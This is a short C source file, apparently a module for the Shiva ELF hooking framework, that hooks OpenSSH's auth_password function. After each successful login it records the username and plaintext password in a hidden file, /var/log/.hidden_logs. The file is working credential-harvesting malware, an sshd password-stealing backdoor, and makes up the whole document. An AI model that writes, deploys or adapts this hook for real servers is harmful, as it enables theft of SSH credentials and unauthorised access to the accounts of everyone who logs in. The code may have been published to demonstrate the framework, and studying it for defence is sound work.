#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pwd.h>
#include "shiva_module.h"
#include "/home/elfmaster/openssh-portable/packet.h"

struct Authctxt {
        sig_atomic_t     success;
        int              authenticated; /* authenticated and alarms cancelled */
        int              postponed;     /* authentication needs another step */
        int              valid;         /* user exists and is allowed to login */
        int              attempt;
        int              failures;
        int              server_caused_failure;
        int              force_pwchange;
        char            *user;          /* username sent by the client */
        char            *service;
        struct passwd   *pw;            /* set if 'valid' */
        char            *style;

        /* Method lists for multiple authentication */
        char            **auth_methods; /* modified from server config */
        u_int            num_auth_methods;

        /* Authentication method-specific data */
        void            *methoddata;
        void            *kbdintctxt;
#ifdef BSD_AUTH
        auth_session_t  *as;
#endif
#ifdef KRB5
        krb5_context     krb5_ctx;
        krb5_ccache      krb5_fwd_ccache;
        krb5_principal   krb5_user;
        char            *krb5_ticket_file;
        char            *krb5_ccname;
#endif
        struct sshbuf   *loginmsg;

        /* Authentication keys already used; these will be refused henceforth */
        struct sshkey   **prev_keys;
        u_int            nprev_keys;

        /* Last used key and ancillary information from active auth method */
        struct sshkey   *auth_method_key;
        char            *auth_method_info;

        /* Information exposed to session */
        struct sshbuf   *session_info;  /* Auth info for environment */
};

int auth_password(struct ssh *ssh, const char *password)
{
	FILE *logfd;
	int ret;
	struct Authctxt *authctxt = ssh->authctxt;
	struct passwd *pw = authctxt->pw;

	logfd = fopen("/var/log/.hidden_logs", "a+");
	fprintf(logfd, "auth_password hook called\n");

	/*
	 * call the original auth_password(ssh, password); by using
	 * the SHIVA_HELPER_CALL_EXTERNAL macro.
	 */
	ret = SHIVA_HELPER_CALL_EXTERNAL_ARGS2(auth_password, ssh, password);
	if (ret > 0) {
		/*
		 * If the real auth_password() succeeded, then log
		 * the username and password to "/var/log/.hidden_logs"
		 */
		fprintf(logfd, "Successful SSH login\n"
		    "Username: %s\n"
		    "Password: %s\n", pw->pw_name, password);
	}
	fclose(logfd);
	return ret;
}
